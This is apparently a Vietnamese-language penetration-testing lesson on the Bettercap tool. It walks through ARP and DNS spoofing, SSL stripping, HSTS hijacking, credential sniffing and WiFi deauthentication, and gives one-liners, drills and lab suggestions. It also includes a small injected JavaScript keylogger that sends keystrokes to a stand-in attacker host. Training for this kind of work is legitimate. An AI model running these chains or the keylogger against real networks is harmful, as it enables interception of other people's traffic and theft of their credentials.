---
title: "09. Tool: Bettercap"
type: tool
tags: [pentest, wireless, bettercap, mitm, arp-spoofing, dns-spoofing, ssl-strip, tool, lesson-09]
aliases: [Bettercap]
created: 2026-04-01
---

> **Prerequisites**: [[06-post-connection-mitm-arp|06. Post-Connection MitM — ARP Spoofing]] · [[07-post-connection-mitm-dns-ssl|07. Post-Connection MitM — DNS & SSL]]
> **Objectives**:
> - Nắm vững bettercap interactive shell và module system
> - Thực hiện toàn bộ MitM attack chain bằng bettercap
> - Sử dụng caplets để automate complex attack sequences
> - Integrate bettercap với rogue AP workflow

---

## Mục đích & Kiến trúc

**Bettercap** là framework MitM "Swiss Army Knife" — thay thế ettercap với architecture hiện đại viết bằng Go. Nó xử lý network discovery, ARP/DNS/DHCP spoofing, HTTP/HTTPS proxying, packet sniffing, và JavaScript injection trong một công cụ.

**Architecture**:

```
Bettercap Core (Go)
├── Interactive Shell (REPL)     ← gõ commands trực tiếp
├── Module System                ← các attack modules
│   ├── net.recon               ← host discovery
│   ├── arp.spoof               ← ARP poisoning
│   ├── dns.spoof               ← DNS resolution hijack
│   ├── http.proxy              ← HTTP transparent proxy
│   ├── https.proxy             ← HTTPS MitM proxy
│   ├── net.sniff               ← credential sniffing
│   ├── wifi                    ← wireless attacks (802.11)
│   └── ticker                  ← scheduled events
└── Caplet System                ← scripted attack automation (.cap files)
```

**Bettercap vs Ettercap**: Bettercap dùng được trên mạng lớn không bị lag, có REST API, hỗ trợ WebUI, và actively maintained.

---

## Cài đặt & Setup

```bash
# Kali Linux (thường pre-installed)
bettercap --version

# Cài từ apt
sudo apt update && sudo apt install -y bettercap

# Cài từ GitHub (latest binary)
# https://github.com/bettercap/bettercap/releases

# Update caplets
sudo bettercap -eval "caplets.update; q"

# Verify caplets location
ls /usr/share/bettercap/caplets/
```

> [!tip] Luôn chạy với sudo
> Bettercap cần raw socket và ARP manipulation — yêu cầu root. Không có root → ARP spoof và packet injection thất bại.

---

## Core Workflow

**Bước 1 — Launch và Discovery**

```bash
# Start bettercap trên interface target
sudo bettercap -iface wlan1
```

> **Expected output**: Bettercap shell prompt `192.168.1.50 (wlan1) >>`.

```bash
# Trong shell — discover hosts
net.probe on
```

> **Expected output**: `[net.recon] new host: 192.168.1.10 (AA:BB:CC:11) Corp-Laptop`.

```bash
# View discovered hosts
net.show
```

> **Expected output**: Bảng với IP, MAC, hostname, vendor của tất cả hosts.

**Bước 2 — ARP Spoofing**

```bash
set arp.spoof.targets 192.168.1.10
set arp.spoof.fullduplex true
arp.spoof on
```

> **Expected output**: `[arp.spoof] full duplex spoofing 192.168.1.10`.

**Bước 3 — DNS Spoofing**

```bash
set dns.spoof.all true
set dns.spoof.address 192.168.1.50
dns.spoof on
```

> **Expected output**: `[dns.spoof] started`. Sau đó `[dns.spoof] 192.168.1.10 is asking for target.com = 192.168.1.50`.

**Bước 4 — HTTP/HTTPS Proxy + SSL Strip**

```bash
set https.proxy.sslstrip true
http.proxy on
https.proxy on
```

> **Expected output**: `[http.proxy] started on :8080`, `[https.proxy] started on :8083 (sslstrip on)`.

**Bước 5 — Sniff Credentials**

```bash
net.sniff on
set net.sniff.verbose true
```

> **Expected output**: Credentials và packets hiển thị realtime. HTTP POST với password field highlighted.

---

## Key Flags & Options

### Command-line Flags

| Flag | Ý nghĩa |
|------|---------|
| `-iface <n>` | Network interface để bind (bắt buộc) |
| `-eval "<cmds>"` | Chạy commands khi khởi động (semicolon-separated) |
| `-caplets <dir>` | Directory tìm caplets |
| `-no-history` | Không lưu command history |
| `-silent` | Giảm output noise |
| `-debug` | Enable debug logging |

### Module Commands (trong shell)

**net.recon / net.probe**

| Command | Ý nghĩa |
|---------|---------|
| `net.probe on` | Gửi UDP probes để discover hosts |
| `net.probe off` | Stop probing |
| `net.show` | Hiện tất cả discovered hosts |
| `net.clear` | Xóa host list |

**arp.spoof**

| Command | Ý nghĩa |
|---------|---------|
| `set arp.spoof.targets <IP>` | Target IP(s) — comma-separated |
| `set arp.spoof.fullduplex true` | Poison cả victim và gateway |
| `set arp.spoof.internal true` | Spoof traffic giữa các hosts (không qua gateway) |
| `arp.spoof on/off` | Start/stop ARP poisoning |
| `arp.ban on` | ARP spoof + drop packets (DoS mode) |

**dns.spoof**

| Command | Ý nghĩa |
|---------|---------|
| `set dns.spoof.domains <d>` | Domains để spoof (comma-separated, wildcard OK) |
| `set dns.spoof.all true` | Spoof ALL domains |
| `set dns.spoof.address <IP>` | IP để redirect đến |
| `dns.spoof on/off` | Start/stop DNS spoofing |

**http.proxy / https.proxy**

| Command | Ý nghĩa |
|---------|---------|
| `set https.proxy.sslstrip true` | Enable SSLStrip |
| `set http.proxy.injectjs <f>` | Inject JavaScript file vào HTTP responses |
| `set https.proxy.certificate <f>` | Custom CA cert |
| `http.proxy on/off` | Start/stop HTTP proxy |
| `https.proxy on/off` | Start/stop HTTPS proxy |

**net.sniff**

| Command | Ý nghĩa |
|---------|---------|
| `net.sniff on/off` | Start/stop packet sniffing |
| `set net.sniff.verbose true` | Show all packets (không chỉ creds) |
| `set net.sniff.regexp "<r>"` | Filter packets theo regex |
| `set net.sniff.output <f>` | Save packets to PCAP file |

**wifi (Wireless module)**

| Command | Ý nghĩa |
|---------|---------|
| `wifi.recon on` | Scan for WiFi networks |
| `wifi.show` | List discovered APs và clients |
| `wifi.deauth <BSSID>` | Deauthenticate all clients của AP |
| `wifi.assoc <BSSID>` | Associate với AP |

---

## Common Patterns

**Pattern 1 — Full MitM one-liner**

```bash
sudo bettercap -iface wlan1 -eval \
    "set arp.spoof.targets TARGET_IP; \
     set arp.spoof.fullduplex true; \
     arp.spoof on; \
     set dns.spoof.all true; \
     set dns.spoof.address ATTACKER_IP; \
     dns.spoof on; \
     set https.proxy.sslstrip true; \
     http.proxy on; https.proxy on; \
     net.sniff on"
```

**Pattern 2 — JavaScript Injection**

```bash
# inject.js — keylogger đơn giản
set http.proxy.injectjs /tmp/inject.js
http.proxy on
# inject.js content:
# document.onkeypress = function(e) {
#   new Image().src = "http://ATTACKER_IP/log?k=" + e.key;
# }
```

**Pattern 3 — Credential Sniff Only (Passive — từ rogue AP)**

```bash
# Khi victim đã kết nối rogue AP — attacker đã là gateway
# Không cần ARP spoof — chỉ sniff
sudo bettercap -iface wlan1 -eval "net.sniff on; set net.sniff.verbose true"
```

**Pattern 4 — WiFi Deauth qua Bettercap**

```bash
sudo bettercap -iface wlan0mon -eval \
    "wifi.recon on; wifi.show"

# Sau đó trong shell:
wifi.deauth AA:BB:CC:DD:EE:FF
```

**Pattern 5 — Caplet: hstshijack**

```bash
# HSTS bypass cho specific domains
sudo bettercap -iface wlan1 -caplets hstshijack/hstshijack

# Hoặc trong shell:
set hstshijack.targets www.example.com
set hstshijack.replacements wwww.example.com
hstshijack/hstshijack
```

**Pattern 6 — Save PCAP**

```bash
set net.sniff.output /tmp/capture.pcap
net.sniff on
# Sau đó phân tích trong Wireshark
```

---

## Command Cheatsheet

**Launch**

```bash
sudo bettercap -iface <INTERFACE>
sudo bettercap -iface <INTERFACE> -eval "<COMMANDS>"
sudo bettercap -iface <INTERFACE> -caplets <CAPLET_NAME>
```

**Discovery**

```bash
net.probe on
net.show
net.clear
```

**ARP Spoof**

```bash
set arp.spoof.targets <IP>
set arp.spoof.fullduplex true
arp.spoof on
# Entire subnet (no target set):
arp.spoof on
```

**DNS Spoof**

```bash
set dns.spoof.all true
set dns.spoof.address <ATTACKER_IP>
dns.spoof on
# Specific domain:
set dns.spoof.domains target.com,*.target.com
```

**HTTP/S Proxy**

```bash
set https.proxy.sslstrip true
http.proxy on
https.proxy on
# JavaScript inject:
set http.proxy.injectjs /path/to/script.js
```

**Sniffing**

```bash
net.sniff on
set net.sniff.verbose true
set net.sniff.output /tmp/capture.pcap
```

**WiFi**

```bash
wifi.recon on
wifi.show
wifi.deauth <BSSID>
```

**System**

```bash
# Enable IP forwarding (bên ngoài bettercap)
sudo sysctl -w net.ipv4.ip_forward=1

# Cleanup
arp.spoof off; dns.spoof off; http.proxy off; https.proxy off; net.sniff off
```

---

## Daily Drill

**Thời gian**: 15–20 phút/ngày trong 7 ngày đầu.

**Drill 1 — Launch + Discovery + ARP sequence**

```bash
sudo bettercap -iface wlan1
# Trong shell:
net.probe on
net.show
set arp.spoof.targets 192.168.1.10
set arp.spoof.fullduplex true
arp.spoof on
```

Luyện cho đến khi: 5 commands trong shell gõ tự nhiên dưới 20 giây.

**Drill 2 — Phân biệt khi nào dùng `dns.spoof.all` vs `dns.spoof.domains`**

- `dns.spoof.all true`: Redirect tất cả queries → mạnh nhưng noisy, break internet
- `dns.spoof.domains target.com`: Chỉ redirect specific domains → stealth hơn

Luyện cho đến khi: explain trade-off trong 30 giây.

**Drill 3 — One-liner full chain từ memory**

```bash
sudo bettercap -iface wlan1 -eval "set arp.spoof.targets TARGET; set arp.spoof.fullduplex true; arp.spoof on; set dns.spoof.all true; set dns.spoof.address ATTACKER; dns.spoof on; set https.proxy.sslstrip true; http.proxy on; https.proxy on; net.sniff on"
```

Luyện cho đến khi: gõ one-liner hoàn chỉnh đúng syntax.

**Drill 4 — Cleanup sequence**

```bash
arp.spoof off
dns.spoof off
http.proxy off
https.proxy off
net.sniff off
# Bên ngoài:
sudo sysctl -w net.ipv4.ip_forward=0
sudo iptables -F && sudo iptables -t nat -F
```

Luyện cho đến khi: cleanup hoàn chỉnh trong dưới 30 giây sau engagement.

---

## Kết hợp với Tool khác

```
bettercap (arp.spoof) + EAPHammer (rogue AP) → full wireless MitM chain
bettercap (net.sniff) → Wireshark (phân tích PCAP chi tiết)
bettercap (dns.spoof) + nginx (phishing page) → credential phishing
bettercap (http.proxy.injectjs) + BeEF → browser exploitation
bettercap (wifi.deauth) + hostapd (rogue AP) → evil twin manual chain
bettercap → impacket-ntlmrelayx → SMB relay attack trên captured NTLM
```

```bash
# Pipeline: Bettercap sniff → Wireshark analysis
set net.sniff.output /tmp/session.pcap
net.sniff on
# ... sau khi thu thập xong:
wireshark /tmp/session.pcap
# Filter: http.request.method == "POST"
```

---

## Lab Thực hành

| Platform | Machine / Module | Tại sao phù hợp |
|----------|---------|----------------|
| HTB | **Poison** (Retired) | ARP/DNS poisoning + MitM — classic bettercap lab |
| HTB Academy | **Wi-Fi Evil Twin Attacks** | Post-connection MitM section với bettercap |
| Local VMs | Kali + Windows (DVWA) + Gateway VM | Full control — practice cả SSL strip lẫn credential harvest |
| HTB Academy | **Attacking Corporate Wi-Fi Networks** | Full MitM chain trong simulated enterprise |

---

## Field Manual Entry

> [!abstract] Bettercap — Quick Reference
> **Condition**: Post-connection MitM; cùng subnet với victim
> **Quick command**: `sudo bettercap -iface wlan1 -eval "set arp.spoof.targets TARGET; arp.spoof on; net.sniff on"`
> **Full MitM**: `arp.spoof on` → `dns.spoof on` → `https.proxy sslstrip on` → `net.sniff on`
> **HSTS bypass**: `-caplets hstshijack/hstshijack`
> **JS inject**: `set http.proxy.injectjs /path/script.js; http.proxy on`
> **Save PCAP**: `set net.sniff.output /tmp/cap.pcap; net.sniff on`
> **Cleanup**: `arp.spoof off; ip_forward=0; iptables -F`
> **Ref**: [[09-tool-bettercap|09. Tool: Bettercap]]
